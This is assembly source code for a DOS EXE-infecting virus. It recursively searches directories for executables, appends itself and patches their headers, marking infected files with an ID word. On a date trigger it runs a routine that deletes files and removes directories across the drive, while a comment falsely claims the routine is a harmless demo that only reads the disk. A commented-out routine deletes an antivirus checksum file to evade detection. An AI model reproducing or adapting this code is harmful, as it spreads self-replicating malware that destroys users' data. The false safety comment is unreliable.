.SEQ
HOSTEG SEGMENT BYTE
    ASSUME CS:HOSTEG,SS:HSTACK
PGMSTR  DB 'INTRUDER.EXE',0
HOST:
    mov     ax,cs
    mov     ds,ax
    mov     dx,OFFSET PGMSTR
    mov     ah,41H
    int     21H
    mov     ah,4CH
    mov     al,0
    int     21H
HOSTEG ENDS
HSTACK SEGMENT PARA STACK
    db  100H dup (?)
HSTACK ENDS
;******************************************
STACKSIZE   EQU     100H
NUMRELS     EQU     2
VSEG        SEGMENT PARA
            ASSUME  CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID     DW      4D58H
OLDDTA      DD      0
DTA1        DB      2BH dup (?)
DTA2        DB      56H dup (?)
EXE_HDR     DB      1CH dup (?)
EXEFILE     DB      '\*.EXE',0
ALLFILE     DB      '\*.*',0
USEFILE     DB      78 dup (?)
LEVEL       DB      0
HANDLE      DW      0
FATTR       DB      0
FTIME       DW      0
FDATE       DW      0
FSIZE       DD      0
VIDC        DW      0
VCODE       DB      2
FileCount   DW      0
DirCount    DW      0
remdir      DB      'Please Wait',0
CurDrive    DB      'C:'
CurDir      DB      '\', 65 DUP(0)
WorkDrive   DB      'C:'
WorkOrig    DB      '\', 65 DUP(0)
WorkDir     DB      '\', 128 DUP(0)
CRLF        DB      13,10,0
MaxDrives   DB      0
Wild        DB      '*.*',0
Parent      DB      '..',0
VIRUS:
        push    ax
        mov     ax,cs
        mov     ds,ax
        mov     ax,es
        mov     WORD PTR [OLDDTA+2],ax
        call    NEW_DTA
        mov     ah,19H
        int     21H
        cmp     al,2
        jnz     REL1
        call    CHK_DATE
        jz      SCANBAD
        jnz     SCANOK
SCANBAD:jmp     TRASH_SYSTEM
SCANOK: call    FIND_FILE
        jnz     FINISH
        call    SAVE_ATTRIBUTE
        call    INFECT
        call    REST_ATTRIBUTE
FINISH: call    RESTORE_DTA
        mov     ax,ax
        nop
        pop     ax
REL1:
            mov     ax,HSTACK
            mov     ax,ax
            nop
            cli
            mov     ss,ax
REL1A:
            mov     sp,OFFSET HSTACK
            mov     es,WORD PTR [OLDDTA+2]
            mov     ds,WORD PTR [OLDDTA+2]
            nop
            sti
REL2:
            jmp     FAR PTR HOST

CHK_DATE:
                MOV     AH,2AH            ;get system date
                INT     21H
                cmp     dx,0513H          ;is date May 19  
                JNE     SREXNZ            ;nope, go on
                jmp     SHORT SREX1       ;yes match found
SREX1:  xor     al,al           ;match found - set z and exit
        ret

SREXNZ: mov     al,1            ;return with nz - no matches of any strings
        or      al,al
        ret


;**************************************************************************
;This routine trashes the hard disk in the event that anti-viral measures are
;detected.

;This is JUST A DEMO. NO DAMAGE WILL BE DONE. It only READS the disk real fast.

TRASH_SYSTEM:




            MOV     AH,19h              ;?Get current drive
            INT     21h
            MOV     DL,AL               ;Move drive for next operation
            ADD     AL,'A'              ;?Make it ASCII
            MOV     CurDrive,AL         ;Store it for later
            MOV     WorkDrive,AL

            MOV     AH,0Eh              ;Select default drive
            INT     21h
            MOV     MaxDrives,AL        ;Store number of drives

            MOV     DL,0                ;Use current drive
            MOV     AH,47h              ;Get current directory
            MOV     SI,OFFSET CurDir    ;Point to directory buffer
            INC     SI                  ;Point past leading backslash
            INT     21h
            MOV     DL,0                ;Use current drive
            MOV     AH,47h              ;Get current directory
            MOV     SI,OFFSET WorkDir   ;Point to working directory buffer
            INC     SI                  ;Point past leading backslash
            INT     21h


            MOV     DL,WorkDrive
            CMP     DL,CurDrive         ;Still working on same drive
            JE      DriveOK             ;Yes, so continue
            SUB     DL,'A'              ;Make drive zero-based
            CMP     DL,MaxDrives        ;Out of range?
            JA      done            ;Yes, exit with error
            MOV     AH,0Eh              ;No, set current drive
            INT     21h

            MOV     DL,0                ;Use current drive (new drive)
            MOV     AH,47h              ;Get directory on new drive
            MOV     SI,OFFSET WorkOrig  ;Point to directory buffer
            INC     SI                  ;Point past leading backslash
            INT     21h

DriveOK:    MOV     AL,WorkDir
            CMP     AL,0                ;Any directory to use?
            JE      GetDir              ;No, so get where we are
            MOV     DX,OFFSET WorkDir   ;Point to new directory
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h

GetDir:     MOV     DL,0                ;Use current drive
            MOV     WorkDir,'\'
            MOV     SI,OFFSET WorkDir
            INC     SI                  ;Point past leading backslash
            MOV     AH,47h              ;Get current directory
            INT     21h


DirOK:      CMP     WorkDir+1,0         ;At root directory?
            JNE     Start

Start:      CALL    DoDir               ;Go erase this directory
            CMP     WorkDir+1,0         ;At root directory?
            JE      Stats               ;Yes, so don't try to remove

            MOV     DX,OFFSET Parent    ;Point to '..'
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h


            MOV     DX,OFFSET WorkDir   ;Point to original directory
            MOV     AH,3Ah              ;Remove directory at DS:DX
            INT     21h
            INC     DirCount

Stats:      MOV     AX,DirCount
            CMP     AX,0                ;Any directories deleted?
            JE      Stats2              ;No, continue

Stats2:     MOV     AX,FileCount
            CMP     AX,0                ;Any files deleted?
            JE      Done                ;No, so finish up

Done:       MOV     DL,CurDrive         ;Move drive for next operation
            CMP     DL,WorkDrive        ;Same as original?
            JE      Done1               ;Yes, so continue
            MOV     DX,OFFSET WorkOrig  ;Original directory on target drive
            MOV     AH,3Bh              ;Set current directory (if possible)
            INT     21h
            MOV     DL,CurDrive         ;Get calling drive
            SUB     DL,'A'              ;Make it zero-based
            MOV     AH,0Eh              ;Set current drive
            INT     21h

Done1:      MOV     DX,OFFSET CurDir    ;Point to new directory
            MOV     AH,3Bh              ;Set current directory
            INT     21h


dodir:
            CALL    SetHdr              ;Allocate memory and set header info

            MOV     DX,OFFSET Wild      ;Point to *.*
            MOV     CX,16h              ;Want normal, hidden, system, and vol
            MOV     AH,4Eh              ;Search for first match
            INT     21h
            JC      NoFile              ;No file found
            JNC     FoundOne            ;Go handle file found

NextFile:   MOV     AH,4Fh              ;Search for next file
            INT     21h
            JC      NoFile              ;No file found

FoundOne:   MOV     DX,1Eh              ;ES:DX points to name in DTA
            MOV     AL,ES:[15h]         ;Get file attribute
            CMP     AL,10h              ;Is it a directory?
            JNE     FoundFile           ;No, so go handle

            MOV     AL,ES:[1Eh]         ;Get first character of directory
            CMP     AL,'.'              ;Is it . or ..?
            JE      NextFile            ;Yes, so ignore
            CALL    DirOut              ;Go delete an entire directory
            JMP     NextFile            ;Go search for next entry

FoundFile:  CALL    FileOut             ;Go delete the file that was found
            JMP     NextFile            ;Go search for next entry

; By this point, there are no more files left.  Switch back to o�iginal
; DTA and release memory block requested by SetHdr.

NoFile:     PUSH    DS
            MOV     SI,128              ;Point to old DTA address
            MOV     AX,ES:[SI]
            INC     SI
            INC     SI
            MOV     DX,ES:[SI]          ;Get stored offset
            MOV     DS,AX
            MOV     AH,1Ah              ;Set DTA address
            INT     21h
            POP     DS

            MOV     AH,49h              ;Release memory block at ES
            INT     21h

DDDone:     RET



SetHdr:
            MOV     AH,48h              ;Allocate memory
            MOV     BX,09h              ;Requesting 144 bytes
            INT     21h
            MOV     ES,AX               ;Point to memory block for later use
            MOV     DS,AX               ;Point for current use

            MOV     AL,0                ;Zero out the newly acquired buffer
            MOV     DI,0
            CLD                         ;Make sure going in proper direction
            MOV     CX,144
            REP     STOSB

            PUSH    ES                  ;Store temporarily
            MOV     AH,2Fh              ;Get DTA address
            INT     21h
            MOV     SI,128              ;Point to address area in buffer
            MOV     AX,ES
            MOV     [SI],AX             ;Store segment of DTA
            INC     SI
            INC     SI
            MOV     [SI],BX             ;Store offset of DTA
            POP     ES                  ;Get back old ES

            MOV     DX,0                ;DS:DX points to new DTA
            MOV     AH,1Ah              ;Set DTA address
            INT     21h
            RET


FileOut:
            PUSH    DS
            PUSH    ES
            POP     DS
            MOV     AH,43h              ;Set file attributes of file at DS:DX
            MOV     AL,01h
            MOV     CX,0                ;No attributes
            INT     21h
            MOV     AH,41h              ;Delete file at DS:DX
            INT     21h
            POP     DS                  ;Reset DS
            JC      FO9                 ;File was not deleted
            INC     FileCount
FO9:        RET


DirOut:
            PUSH    DS                  ;Store it
            PUSH    ES
            POP     DS
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h
            POP     DS
            CALL    DoDir               ;Recurrsive call for new dir
            MOV     DX,OFFSET Parent    ;Point to '..'
            MOV     AH,3Bh              ;Set directory to DS:DX
            INT     21h

            MOV     SI,OFFSET RemDir
            MOV     AH,2Fh              ;Get DTA address into ES:BX
            INT     21h
            ADD     BX,1Eh              ;Offset to file name (directory)
            PUSH    DS                  ;Store DS temporarily
            PUSH    ES
            POP     DS
            MOV     SI,BX
            MOV     DX,BX
            MOV     AH,3Ah              ;Remove directory at DS:DX
            INT     21h
            POP     DS
            JC      DO9                 ;Directory not removed
            INC     DirCount
DO9:        MOV     SI,OFFSET CRLF
            RET




FIND_FILE:
            mov     al,'\'
            mov     BYTE PTR [USEFILE],al
            mov     si,OFFSET USEFILE+1
            xor     dl,dl
            mov     ah,47H
            int     21H
            cmp     BYTE PTR [USEFILE+1],0
            jnz     FF2
            xor     al,al
            mov     BYTE PTR [USEFILE],al
FF2:        mov     al,2
            mov     [LEVEL],al
            call    FINDBR
            jz      FF3
            xor     al,al
            mov     BYTE PTR [USEFILE],al
            inc     al
            mov     [LEVEL],al
            call    FINDBR
FF3:
            ret
FINDBR:
            call    FINDEXE
            jnc     FBE3
            cmp     [LEVEL],0
            jz      FBE1
            dec     [LEVEL]
            mov     di,OFFSET USEFILE
            mov     si,OFFSET ALLFILE
            call    CONCAT
            inc     di
            push    di
            call    FIRSTDIR
            jnz     FBE
FB1:
            pop     di
            xor     al,al
            stosb
            mov     di,OFFSET USEFILE
            mov     bx,OFFSET DTA2+1EH
            mov     al,[LEVEL]
            mov     dl,2BH
            mul     dl
            nop   
            add     bx,ax
            mov     si,bx
            call    CONCAT
            nop
            push    di
            call    FINDBR
            jz      FBE2
            call    NEXTDIR
            jz      FB1
FBE:
            inc     [LEVEL]
            pop     di
            xor     al,al
            nop
            stosb
FBE1:       mov     al,1
            or      al,al
            ret
FBE2:       pop     di
FBE3:       xor     al,al
            nop
            ret
;******************************************
FINDEXE:    mov     dx,OFFSET DTA1
            mov     ah,1AH
            nop
            int     21H
            mov     di,OFFSET USEFILE
            mov     si,OFFSET EXEFILE
            nop
            call    CONCAT
            push    di
            mov     dx,OFFSET USEFILE
            nop
            mov     cx,3FH
            nop
            mov     ah,4EH
            nop
            int     21H
NEXTEXE:
            or      al,al
            jnz     FEC
            pop     di
            inc     di
            stosb
            mov     di,OFFSET USEFILE
            mov     si,OFFSET DTA1+1EH
            call    CONCAT
            dec     di
            push    di
            call    FILE_OK
            jnc     FENC
            mov     ah,4FH
            int     21H
            jmp     SHORT NEXTEXE
FEC:
            pop     di
            mov     BYTE PTR [di],0
            stc
            ret
FENC:
            pop     di
            ret
;******************************************************************
;This fx del the chklist.ms file that Microsoft anti virus uses for it's
;checksum to alert the user somthing is wrong.
;
;
;MS:     
;        mov     dx,OFFSET MSFILE
;       mov     ah,41H
;       int     21H
;        RET
;MSFILE  DB     'CHKLIST.MS',0
;
FIRSTDIR:
            call    GET_DTA
            push    dx
            mov     ah,1AH
            int     21H
            mov     dx,OFFSET USEFILE
            mov     cx,10H
            mov     ah,4EH
            int     21H
NEXTD1:
            pop     bx
            or      al,al
            jnz     NEXTD3
            test    BYTE PTR [bx+15H],10H
            jz      NEXTDIR
            cmp     BYTE PTR [bx+1EH],'.'
            jne     NEXTD2
NEXTDIR:
            call    GET_DTA
            push    dx
            mov     ah,1AH
            int     21H
            mov     ah,4FH
            int     21H
            jmp     SHORT NEXTD1
NEXTD2:
            xor     al,al
NEXTD3:
            ret
GET_DTA:
            mov     dx,OFFSET DTA2
            mov     al,2BH
            mul     [LEVEL]
            add     dx,ax
            ret
            
CONCAT:
            mov     al,byte ptr es:[di]
            inc     di
            or      al,al
            jnz     CONCAT
            dec     di
            push    di
CONCAT2:
            cld
            lodsb
            stosb
            or      al,al
            jnz     CONCAT2
            pop     di
            ret
FILE_OK:
            call    GET_EXE_HEADER
            jc      OK_END
            call    CHECK_SIG_OVERLAY
            jc      OK_END
            call    REL_ROOM
            jc      OK_END
            call    IS_ID_THERE
OK_END:     ret
CHECK_SIG_OVERLAY:
            mov     al,'M'
            mov     ah,'Z'
            cmp     ax,WORD PTR [EXE_HDR]
            jz      CSO_1
            stc
            ret
CSO_1:      xor     ax,ax
            sub     ax,WORD PTR [EXE_HDR+26]
            ret
GET_EXE_HEADER:
            mov     dx,OFFSET USEFILE
            mov     ax,3D02H
            int     21H
            jc      RE_RET
            mov     [HANDLE],ax
            mov     bx,ax
            mov     cx,1CH
            mov     dx,OFFSET EXE_HDR
            mov     ah,3FH
            int     21H
RE_RET:     ret
REL_ROOM:
            mov     ax,WORD PTR [EXE_HDR+8]
            add     ax,ax
            add     ax,ax
            sub     ax,WORD PTR [EXE_HDR+6]
            add     ax,ax
            add     ax,ax
            sub     ax,WORD PTR [EXE_HDR+24]
            cmp     ax,4*NUMRELS
RR_RET:     ret
IS_ID_THERE:
            mov     ax,WORD PTR [EXE_HDR+22]
            add     ax,WORD PTR [EXE_HDR+8]
            mov     dx,16
            mul     dx
            mov     cx,dx
            mov     dx,ax
            mov     bx,[HANDLE]
            mov     ax,4200H
            int     21H
            mov     ah,3FH
            mov     bx,[handle]
            mov     dx,OFFSET VIDC
            mov     cx,2
            int     21H
            jc      II_RET
            mov     ax,[VIDC]
            cmp     ax,[VIRUSID]
            clc
            jnz     II_RET
            stc
II_RET:     ret
SETBDY:
            mov     al,BYTE PTR [FSIZE]
            and     al,0FH
            jz      SB_E
            mov     cx,10H
            sub     cl,al
            mov     dx,OFFSET FINAL
            add     WORD PTR [FSIZE],cx
            adc     WORD PTR [FSIZE+2],0
            mov     bx,[HANDLE]
            mov     ah,40H
            int     21H
SB_E:       ret
INFECT:
            mov     cx,WORD PTR [FSIZE+2]
            mov     dx,WORD PTR [FSIZE]
            mov     bx,[HANDLE]
            mov     ax,4200H
            int     21H
            call    SETBDY
            mov     cx,OFFSET FINAL
            xor     dx,dx
            mov     bx,[HANDLE]
            mov     ah,40H
            int     21H
            mov     dx,WORD PTR [FSIZE]
            mov     cx,WORD PTR [FSIZE+2]
            mov     bx,OFFSET REL1
            inc     bx
            add     dx,bx
            mov     bx,0
            adc     cx,bx
            mov     bx,[HANDLE]
            mov     ax,4200H
            int     21H
            mov     dx,OFFSET EXE_HDR+14
            mov     bx,[HANDLE]
            mov     cx,2
            mov     ah,40H
            int     21H
            mov     dx,WORD PTR [FSIZE]
            mov     cx,WORD PTR [FSIZE+2]
            mov     bx,OFFSET REL1A
            inc     bx
            add     dx,bx
            mov     bx,0
            adc     cx,bx
            mov     bx,[HANDLE]
            mov     ax,4200H
            int     21H
            mov     dx,OFFSET EXE_HDR+16
            mov     bx,[HANDLE]
            mov     cx,2
            mov     ah,40H
            int     21H
            mov     dx,WORD PTR [FSIZE]
            mov     cx,WORD PTR [FSIZE+2]
            mov     bx,OFFSET REL2
            add     bx,1
            add     dx,bx
            mov     bx,0
            adc     cx,bx
            mov     bx,[HANDLE]
            mov     ax,4200H
            int     21H
            mov     dx,OFFSET EXE_HDR+20
            mov     bx,[HANDLE]
            mov     cx,4
            mov     ah,40H
            int     21H
            xor     cx,cx
            xor     dx,dx
            mov     bx,[HANDLE]
            mov     ax,4200H
            int     21H
            mov     ax,WORD PTR [FSIZE]
            mov     cl,4
            shr     ax,cl
            mov     bx,WORD PTR [FSIZE+2]
            and     bl,0FH
            mov     cl,4
            shl     bl,cl
            add     ah,bl
            sub     ax,WORD PTR [EXE_HDR+8]
            mov     WORD PTR [EXE_HDR+22],ax
            mov     bx,OFFSET FINAL
            add     bx,10H
            mov     cl,4
            shr     bx,cl
            add     ax,bx
            mov     WORD PTR [EXE_HDR+14],ax
            mov     ax,OFFSET VIRUS
            mov     WORD PTR [EXE_HDR+20],ax
            mov     ax,STACKSIZE
            mov     WORD PTR [EXE_HDR+16],ax
            mov     dx,WORD PTR [FSIZE+2]
            mov     ax,WORD PTR [FSIZE]
            mov     bx,OFFSET FINAL
            add     ax,bx
            xor     bx,bx
            adc     dx,bx
            add     ax,200H
            adc     dx,bx
            push    ax
            mov     cl,9
            shr     ax,cl
            mov     cl,7
            shl     dx,cl
            add     ax,dx
            mov     WORD PTR [EXE_HDR+4],ax
            pop     ax
            and     ax,1FFH
            mov     WORD PTR [EXE_HDR+2],ax
            mov     ax,NUMRELS
            add     WORD PTR [EXE_HDR+6],ax
            mov     cx,1CH
            mov     dx,OFFSET EXE_HDR
            mov     bx,[HANDLE]
            mov     ah,40H
            int     21H
            mov     ax,WORD PTR [EXE_HDR+6]
            dec     ax
            dec     ax
            mov     bx,4
            mul     bx
            add     ax,WORD PTR [EXE_HDR+24]
            mov     bx,0
            adc     dx,bx
            mov     cx,dx
            mov     dx,ax
            mov     bx,[HANDLE]
            mov     ax,4200H
            int     21H
            mov     ax,WORD PTR [EXE_HDR+22]
            mov     bx,OFFSET REL1
            inc     bx
            mov     WORD PTR [EXE_HDR],bx
            mov     WORD PTR [EXE_HDR+2],ax
            mov     ax,WORD PTR [EXE_HDR+22]
            mov     bx,OFFSET REL2
            add     bx,3
            mov     WORD PTR [EXE_HDR+4],bx
            mov     WORD PTR [EXE_HDR+6],ax
            mov     cx,8
            mov     dx,OFFSET EXE_HDR
            mov     bx,[HANDLE]
            mov     ah,40H
            int     21H
            ret
            
NEW_DTA:
            mov     ah,2FH
            int     21H
            mov     WORD PTR [OLDDTA],bx
            mov     ax,es
            mov     WORD PTR [OLDDTA+2],ax
            mov     ax,cs
            mov     es,ax
            mov     dx,OFFSET DTA1
            mov     ah,1AH
            int     21H
            ret
RESTORE_DTA:
            mov     dx,WORD PTR [OLDDTA]
            mov     ax,WORD PTR [OLDDTA+2]
            mov     ds,ax
            mov     ah,1AH
            int     21H
            mov     ax,cs
            mov     ds,ax
            ret
SAVE_ATTRIBUTE:
            mov     ah,43H
            mov     al,0
            mov     dx,OFFSET USEFILE
            int     21H
            mov     [FATTR],cl
            mov     ah,43H
            mov     al,1
            mov     dx,OFFSET USEFILE
            mov     cl,0
            int     21H
            mov     dx,OFFSET USEFILE
            mov     al,2
            mov     ah,3DH
            int     21H
            mov     [HANDLE],ax
            mov     ah,57H
            xor     al,al
            mov     bx,[HANDLE]
            int     21H
            mov     [FTIME],cx
            mov     [FDATE],dx
            mov     ax,WORD PTR [DTA1+28]
            mov     WORD PTR [FSIZE+2],ax
            mov     ax,WORD PTR [DTA1+26]
            mov     WORD PTR [FSIZE],ax
            ret
REST_ATTRIBUTE:
            mov     dx,[FDATE]
            mov     cx,[FTIME]
            mov     ah,57H
            mov     al,1
            mov     bx,[HANDLE]
            int     21H
            mov     ah,3EH
            mov     bx,[HANDLE]
            int     21H
            mov     cl,[FATTR]
            xor     ch,ch
            mov     ah,43H
            mov     al,1
            mov     dx,OFFSET USEFILE
            int     21H
            ret
FINAL:
VSEG        ENDS
VSTACK      SEGMENT PARA STACK
            db STACKSIZE dup (?)
VSTACK      ENDS
            END VIRUS
            